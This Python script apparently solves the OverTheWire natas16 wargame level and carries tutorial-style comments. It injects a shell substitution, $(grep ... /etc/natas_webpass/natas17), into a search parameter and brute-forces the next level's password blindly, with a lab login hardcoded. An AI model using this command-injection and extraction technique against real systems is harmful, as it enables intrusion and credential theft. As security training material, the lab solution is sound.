import requests  #Imports the request library
from requests.auth import HTTPBasicAuth  #specifically from the requests library we want to HTTP authenticate  example https://www.programcreek.com/python/example/103297/requests.auth.HTTPBasicAuth
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  # auth=HTTPBasicAuth('Username', 'Password')
  
filteredchars = ''  #none in here
passwd = ''  #we don't know yet
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  #Characters to be used in the bruteforcing
for char in allchars:  #for loop. For each character in "allchars"
 r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', auth=auth)  #run a get request to natas16 url and adds a grep for the new character in the password location file
   
 if 'doomed' not in r.text:   #if doomed isn't found in the r.text then add the character used in filtered text meaning iti didn't work
  filteredchars = filteredchars + char  
  print(filteredchars)  #filtered characters 
  
for i in range(32):  
 for char in filteredchars:  #running through the filtered characters
  r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)', auth=auth)  
    
  if 'doomed' not in r.text:  
   passwd = passwd + char  
   print(passwd)  
   break  
